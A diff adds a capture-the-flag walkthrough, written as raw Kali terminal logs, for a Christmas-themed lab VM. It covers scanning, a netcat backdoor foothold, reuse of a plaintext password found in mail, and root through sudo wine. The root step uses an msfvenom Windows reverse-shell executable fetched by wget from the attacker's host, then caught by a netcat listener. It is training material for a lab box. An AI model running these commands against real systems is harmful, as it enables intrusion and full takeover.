@@ -1,1 +1,427 @@
+ENUMERATION
 
+---ifconfig---
+                                                                                
+┌──(root㉿kali)-[/home/okina]
+└─# ifconfig
+eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
+        inet6 fe80::a00:27ff:fef6:e3c3  prefixlen 64  scopeid 0x20<link>
+        ether 08:00:27:f6:e3:c3  txqueuelen 1000  (Ethernet)
+        RX packets 21  bytes 5360 (5.2 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 61  bytes 7032 (6.8 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        inet6 ::1  prefixlen 128  scopeid 0x10<host>
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 24  bytes 1440 (1.4 KiB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 24  bytes 1440 (1.4 KiB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+              
+
+---netdiscover--
+                                                                  
+┌──(root㉿kali)-[/home/okina]
+└─# netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+Currently scanning: 10.0.2.0/24   |   Screen View: Unique Hosts               
+                                                                               
+ 84 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 5040             
+ _____________________________________________________________________________
+   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
+ -----------------------------------------------------------------------------
+ 10.0.2.1        52:54:00:12:35:00     21    1260  Unknown vendor              
+ 10.0.2.2        52:54:00:12:35:00     20    1200  Unknown vendor              
+ 10.0.2.3        08:00:27:a9:19:02     21    1260  PCS Systemtechnik GmbH      
+ 10.0.2.28       08:00:27:99:cd:c7     22    1320  PCS Systemtechnik GmbH      
+
+zsh: suspended  netdiscover -i eth0 -r 10.0.2.0/24 -c 200
+
+
+
+---our target is 10.0.2.28, lets run nmap---
+
+                                                                                      
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.28 -sS -sC -sV -A -T4    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-28 13:13 +03
+Nmap scan report for 10.0.2.28
+Host is up (0.00090s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 76:06:46:f1:83:85:a4:22:8c:2b:12:d4:2d:58:27:49 (ECDSA)
+|_  256 76:54:26:9d:e8:4a:72:5e:6e:7f:68:58:20:6e:bb:d4 (ED25519)
+80/tcp open  http    Apache httpd
+| http-robots.txt: 3 disallowed entries 
+|_/ /administration/ /santa
+|_http-title: The Naughty Elves
+|_http-server-header: Apache
+|_http-server-header: Apache
+MAC Address: 08:00:27:99:CD:C7 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.90 ms 10.0.2.28
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.58 seconds
+       
+
+---when we go to the webpage we see that the system is compromised by naught elves, when we check the link we even get rickrolled :)----
+
+
+---in our nmap scan we see the pages /administration and /santa, when we check santa we see a login form, we have no credentials so lets browse back---
+                                     
+
+---when we come back we see that the main page has changed, we see that santa took it back somehow and trying to keep the naughty elves, let's run another nmap scan---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nmap 10.0.2.28 -sS -sC -sV -A -T4 -p-    
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-28 13:05 +03
+Nmap scan report for 10.0.2.28
+Host is up (0.00068s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu8.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 76:06:46:f1:83:85:a4:22:8c:2b:12:d4:2d:58:27:49 (ECDSA)
+|_  256 76:54:26:9d:e8:4a:72:5e:6e:7f:68:58:20:6e:bb:d4 (ED25519)
+80/tcp    open  http    Apache httpd
+|_http-title: Merry Christmas to everyone - Santa Claus
+|_http-server-header: Apache
+52542/tcp open  unknown
+MAC Address: 08:00:27:99:CD:C7 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.8
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.69 ms 10.0.2.28
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 131.55 seconds
+                              
+
+
+---now we see that there is a new open port which is 52542, let's listen to it with netcat---
+
+
+
+
+					GAINING FOOTHOLD
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc 10.0.2.28 52542                   
+whoami
+alabaster
+id
+uid=1001(alabaster) gid=1001(alabaster) groups=1001(alabaster),100(users)
+ls
+user.txt
+cat user.txt
+                 ..'''::::...
+              .::'      `'''':::..
+        '...::'               `.----.
+                              /.--.\
+                            ,  |=   |
+                          ,/ \,|  =-|
+                        ,/ /`\ \,   |
+                      ,/ /___\ \,-|
+                    ,/ /'.-:";-.`\ \|
+                  ,/ /` //||_\\ `\ \, ,/\,
+                ,/ /`   ||||_||   `\;/ /\ \,
+              ,/ /`     ||||_||   ,/ //\\ \,
+            ,/ /`    ==_`-------' ,/ /` \/ `\ \,
+          ,/ /` __|     _       ,/ /`         =`\ \,
+        ,/ /==_     __|___-  ,/ / ==-=||     `\ \,
+      ,/ /`        --=      ,/ /`            __|-- `\ \,
+    ,/ /`  |__ ..----.. = ,/ /()    .-"""""-.     ()\ \,
+   / /`|     .'.-;;-.'./ /; {} .'.-"""""-.'.  {} ;\ \
+  |/`  |_| =/.; | || | ;|/` | |::|/.'  _____  '.\ |::| | `\|
+       |   |/||||||\| |=\::/||  /|||\  || \::/ |
+       | -=|| | | || | | || |  || || ||||| ||  |||_|
+       | , ||-|-|-||-|-|-||=|  JL || ||||| ||  JL  |
+       |/\||||||||||-|'    ||   .:::.   ||=   _|
+       /_ (|| | | || | | || |  ==|| /:::::::\ || __P_|
+       /_\ \|-|-|-||-|-|-|| |     || |::(`)::| ||/\ |  `\
+      >/ _\\_|_|_||_|_|_||-|-'|__|| \/\+/`\/ ||||_|
+      //   <-------------' |     ||()\/Y\_/  ||/  || |
+     /  ` \_ ( ==_  _|-    ||_  ||   / / \   || =_|| |
+    /_) | _ <   __        |   = ||  // \\  ||   || |
+     >  /     \ == _  ==_   | -   ||           ||=  || |
+    //   ( \  `\ _| =_   =|-|||-----------||| || |
+   )-./ _\ _,-('    __.;-'-;_     """""""""""    ||"-._
+  '-,._   \.--;''          `--'""'""""""`-- `--'--. '
+       ```             ``         """"'""""'"""".--------
+
+----User Flag----
+
+
+
+---now we are in the server as the user alabaster and we found the first user flag, but lets get a fully interactive shell before operating further---
+
+
+---for that I search a python command to upgrade to a fully interactive shell, I found one---
+
+
+python3 -c 'import pty;pty.spawn("/bin/bash")';                    
+alabaster@santa:~$ ls
+ls
+user.txt
+alabaster@santa:~$ whoami
+whoami
+alabaster
+alabaster@santa:~$ 
+
+
+
+
+				PRIVILEGE ESCALATION
+
+
+---I look arounda within the system, couldn't find any valuable info---
+
+---lets take a look at the mails of this user, maybe there is some info there---
+
+mail
+"/var/mail/alabaster": 1 message 1 new
+>N   1 Santa Claus        Wed Mar 27 21:24  25/1108  Important update about th
+? 1
+1
+Return-Path: <santa@santa.hmv>
+Received: from santa.hmv (localhost [127.0.0.1])
+	by santa.hmv (8.17.1.9/8.17.1.9/Debian-2) with ESMTP id 42RLO3jp001688
+	for <alabaster@santa.hmv>; Wed, 27 Mar 2024 21:24:03 GMT
+Received: (from santa@localhost)
+	by santa.hmv (8.17.1.9/8.17.1.9/Submit) id 42RLO3FZ001687;
+	Wed, 27 Mar 2024 21:24:03 GMT
+From: Santa Claus <santa@santa.hmv>
+Message-Id: <202403272124.42RLO3FZ001687@santa.hmv>
+Subject: Important update about the hack
+To: <alabaster@santa.hmv>
+User-Agent: mail (GNU Mailutils 3.15)
+Date: Wed, 27 Mar 2024 21:24:02 +0000
+
+Dear Alabaster, 
+
+As you know our systems have been compromised. You have been assigned to restore all systems as soon as possible. 
+
+I heard you have kicked out the Naughty Elfs so they cannot come back into the system. To be more secure we have hired Bill Gates. 
+
+His account has been created and ready to logon. When Bill arrives, tell him his 
+username is 'bill'. The password has been set to: 'JingleBellsPhishingSmellsHackersGoAway' 
+He will know what to do next. 
+        
+Please help Bill as much as possible so Christmas can go on! 
+
+- Santa 
+
+
+---here we see that alabaster got a message from santa and there is a user named bill (Bill Gates btw) that is tasked to fortify the defenses of the system---
+
+
+
+---after that I had to exit this message and then re enter the the shell---
+
+┌──(root㉿kali)-[/home/okina]
+└─# nc 10.0.2.28 52542
+ls
+user.txt
+whoami
+alabaster
+python3 -c 'import pty;pty.spawn("/bin/bash")'; 
+alabaster@santa:~$ 
+
+
+
+---lets login as bill and see what kind of tasks he is able to perform---
+
+alabaster@santa:~$ su bill
+su bill
+Password: JingleBellsPhishingSmellsHackersGoAway
+
+$ whoami
+whoami
+bill
+
+$ sudo -l
+sudo -l
+Matching Defaults entries for bill on santa:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User bill may run the following commands on santa:
+    (ALL) NOPASSWD: /usr/bin/wine
+
+
+
+---wine is used commonly to run windows applications, lets run it, and then use cmd to see if we can go further with it---
+
+
+sudo /usr/bin/wine
+
+sudo /usr/bin/wine cmd
+
+
+
+---this didn't work out for me, but we know wine can be run with sudo without admin privileges---
+
+---lets create a virus, upload it to our target and then listen from our machine the---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.2.15 LPORT=443 -f exe > /var/www/html/backdoors/shell2.exe       
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7168 bytes
+
+
+
+---lets open our apache server so we can download the virus to our shell from the server---
+                           
+                                                                                    
+┌──(root㉿kali)-[/home/okina]
+└─# service apache2 start               
+                        
+
+
+---open our shell terminal and go to /home/bill location and download our virus---
+
+$ whoami
+whoami
+bill
+$ cd ~
+cd ~
+$ pwd
+pwd
+/home/bill
+
+$ wget http://10.0.2.15/backdoors/shell2.exe
+wget http://10.0.2.15/backdoors/shell2.exe
+--2024-03-28 11:34:02--  http://10.0.2.15/backdoors/shell2.exe
+Connecting to 10.0.2.15:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 7168 (7.0K) [application/x-msdos-program]
+Saving to: ‘shell2.exe’
+
+shell2.exe          100%[===================>]   7.00K  --.-KB/s    in 0s      
+
+2024-03-28 11:34:02 (774 MB/s) - ‘shell2.exe’ saved [7168/7168]
+
+
+
+---go to our main terminal and open up our listener and then execute the virus from shell terminal---
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# rlwrap nc -nvlp 443 
+listening on [any] 443 ...
+
+
+$ sudo /usr/bin/wine shell2.exe
+sudo /usr/bin/wine shell2.exe
+it looks like wine32 is missing, you should install it.
+multiarch needs to be enabled first.  as root, please
+execute "dpkg --add-architecture i386 && apt-get update &&
+apt-get install wine32:i386"
+019c:err:winediag:ntlm_check_version ntlm_auth was not found. Make sure that ntlm_auth >= 3.0.25 is in your path. Usually, you can find it in the winbind package of your distribution.
+019c:err:ntlm:ntlm_LsaApInitializePackage no NTLM support, expect problems
+
+
+
+┌──(root㉿kali)-[/home/okina]
+└─# rlwrap nc -nvlp 443 
+listening on [any] 443 ...
+connect to [10.0.2.15] from (UNKNOWN) [10.0.2.28] 36446
+Microsoft Windows 6.1.7601
+
+Z:\home\bill>whoami
+SANTA\root
+
+
+---boom, we are now the root user---
+
+Z:\root>dir
+Volume in drive Z has no label.
+Volume Serial Number is 4afb-ec36
+
+Directory of Z:\root
+
+  1/4/2024  12:25 PM  <DIR>         .
+12/30/2023   6:55 PM  <DIR>         ..
+12/30/2023   8:10 PM         3,130  root.txt
+12/30/2023   7:16 PM  <DIR>         snap
+       1 file                     3,130 bytes
+       3 directories      2,315,669,504 bytes free
+
+
+Z:\root>type root.txt
+                               ..,,,,,,,,,,,,,,,,.. 
+                        ..,,;;;;;;;;;;;;;;;;;;;;;;;;;;,,. 
+                    .,::::;;;;aaaaaaaaaaaaaaaaaaaaaaaaaaa;;,,. 
+                .,;;,:::a@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@a, 
+              ,;;;;.,a@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@a 
+           ,;;;;%;.,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@a, 
+        ,;%;;;;%%;,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ 
+     ,;;%%;;;;;%%;;@@@@@@@@@@@@@@'%v%v%v%v%v%v%v%v%v%v%v%v`@@@@@@@@@ 
+   ,;;%%;;;;:;;;%;;@@@@@@@@@'%vvvvvvvvvnnnnnnnnnnnnnnnnvvvvvv%`@@@@' 
+  ,;%%;;;;;:;;;;;;;;@@@@@'%vvva@@@@@@@@avvnnnnnnnnnnvva@@@@@@@OOov, 
+ ,;%;;;;;;:::;;;;;;;@@'OO%vva@@@@@@@@@@@@vvnnnnnnnnvv@@@@@@@@@@@Oov 
+ ;%;;;;;;;:::;;;;;;;;'oO%vvn@@%nvvvvvvvv%nnnnnnnnnnnnn%vvvvvvnn%@Ov 
+ ;;;;;;;;;:::;;;;;;::;oO%vvnnnn>>nn.   `nnnnnnnnnnnn>>nn.   `nnnvv' 
+ ;;;;;;;;;:::;;;;;;::;oO%vvnnvvmmmmmmmmmmvvvnnnnnn;%mmmmmmmmmmmmvv, 
+ ;;;;;;;;;:::;;;;;;::;oO%vvmmmmmmmmmmmmmmmmmvvnnnv;%mmmmmmmmmmmmmmmv, 
+ ;;;;;;;;;;:;;;;;;::;;oO%vmmmmnnnnnnnnnnnnmmvvnnnvmm;%vvnnnnnnnnnmmmv 
+  `;%;;;;;;;:;;;;::;;o@@%vvmmnnnnnnnnnnnvnnnnnnnnnnmmm;%vvvnnnnnnmmmv 
+   `;;%%;;;;;:;;;::;.oO@@%vmmnnnnnnnnnvv%;nnnnnnnnnmmm;%vvvnnnnnnmmv' 
+     `;;;%%;;;:;;;::;.o@@%vvnnnnnnnnnnnvv%;nnnnnnnmm;%vvvnnnnnnnv%'@a. 
+      a`;;;%%;;:;;;::;.o@@%vvvvvvvvvvvvvaa@@@@@@@@@@@@aa%%vvvvv%%@@@@o. 
+     .@@o`;;;%;;;;;;::;,o@@@%vvvvvvva@@@@@@@@@@@@@@@@@@@@@avvvva@@@@@%O, 
+    .@@@@@Oo`;;;;;;;;::;o@@@@@@@@@@@@@@@@@@@@"""""""@@@@@@@@@@@@@@@@@OO@a 
+  .@@@@@@@@@OOo`;;;;;;:;o@@@@@@@@@@@@@@@@"           "@@@@@@@@@@@@@@oOO@@@, 
+ .@@@@o@@@@@@@OOo`;;;;:;o,@@@@@@@@@@%vvvvvvvvvvvvvvvvvv%%@@@@@@@@@oOOO@@@@@, 
+ @@@@o@@@@@@@@@OOo;::;'oOOooooooooOOOo%vvvvvvvvvvvvvv%oOOooooooooOOO@@@O@@@, 
+ @@@oO@@@@@@@@@OOa@@@@@a,oOOOOOOOOOOOOOOoooooooooooooOOOOOOOOOOOOOO@@@@Oo@@@ 
+ @@@oO@@@@@@@OOa@@@@@@@@Oo,oO@@@@@@@@@@OOOOOOOOOOOOOO@@@@@@@@@@@@@@@@@@Oo@@@ 
+ @@@oO@@@@@@OO@@@@@@@@@@@OO,oO@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@Oo@@@ 
+ @@@@o@@@@@@OO@@@@@@@@@@OOO,oO@@@@@@@@@O@@@@@@@@@@@@@@@@@@@@@o@@@@@@@@@O@@@@ 
+ @@@@@o@@@@@OOo@@@@@@@OOOO'oOO@@@@@@@@Oo@@@@@@@@@@@@O@@@@@@@@Oo@@@@@@@@@@@@a 
+`@@@@@@@O@@@OOOo`OOOOOOO'oOO@@@@@@@@@O@@@@@@@@@@@@@@@O@@@@@@@@Oo@@@@@@@@@@@@ 
+ `@@@@@OO@@@@@OOOooooooooOO@@@@@@@@@@@@@@@@@@@@@@@@@@Oo@@@@@@@Oo@@@@@@oO@@@@ 
+   `@@@OO@@@@@@@@@@@@@@@@@@@O@@@@@@@@@@@@@@@@@@@@@@@@Oo@@@@@@@O@@@@@@@oO@@@' 
+      `@@`O@@@@@@@@@@@@@@@@@@@Oo@@@@@@@@@@@@@@@@@@@@@@Oo@@@@@@@@@@@@@@@O@@@' 
+        `@ @@@@@@@@@@@@@@@@@@@OOo@@@@@@@@@@@@@@@@@@@@@O@@@@@@@@@@@@@@@'@@' 
+           `@@@@@@@@@@@@@@@@@@OOo@@@@@@@@@@@@@@@@@@@@O@@@@@@@@@@@@@@@ a' 
+               `@@@@@@@@@@@@@@OOo@@@@@@@@@@@@@@@@@@@@@@@@Oo@@@@@@@@' 
+                  `@@@@@@@@@@@Oo@@@@@@@@@@@@@@@@@@@@@@@@@Oo@@@@' 
+                      `@@@@@@Oo@@@@O@@@@@@@@@@@@@@@@@@@'o@@' 
+                          `@@@@@@@@oO@@@@@@@@@@@@@@@@@ a' 
+                              `@@@@@oO@@@@@@@@@@@@@@' ' 
+                                '@@@o'`@@@@@@@@' 
+                                 @'   .@@@@' 
+                                     @@' 
+                                   @'
+
+	
+----Root Flag----
